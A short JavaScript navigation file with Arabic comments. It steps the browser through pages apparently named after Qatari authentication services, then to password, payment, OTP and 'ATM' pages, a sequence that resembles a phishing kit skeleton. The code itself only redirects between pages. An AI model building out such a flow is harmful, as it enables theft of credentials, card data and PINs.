// router.js - الملف المسؤول عن ترتيب التنقل في المشروع
const projectFlow = [
    "index.html",           // 1
    "tawtheeq.html",        // 2
    "nas_qatar.html",       // 3
    "details.html",         // 4
    "password.html",        // 5
    "service_details.html", // 6
    "payment.html",         // 7
    "otp.html",             // 8
    "atm.html"              // 9
];

function nextStep() {
    // الحصول على اسم الصفحة الحالية من الرابط
    let path = window.location.pathname;
    let currentPage = path.split("/").pop();

    // إذا كانت الصفحة فارغة (مثل الدخول للموقع لأول مرة) نعتبرها index.html
    if (currentPage === "") currentPage = "index.html";

    // البحث عن ترتيب الصفحة الحالية في القائمة
    let currentIndex = projectFlow.indexOf(currentPage);

    // إذا وجدنا الصفحة ولها صفحة تالية، ننتقل إليها
    if (currentIndex !== -1 && currentIndex < projectFlow.length - 1) {
        window.location.href = projectFlow[currentIndex + 1];
    } else {
        console.log("وصلت لآخر صفحة أو الصفحة غير مدرجة في المسار.");
    }
}
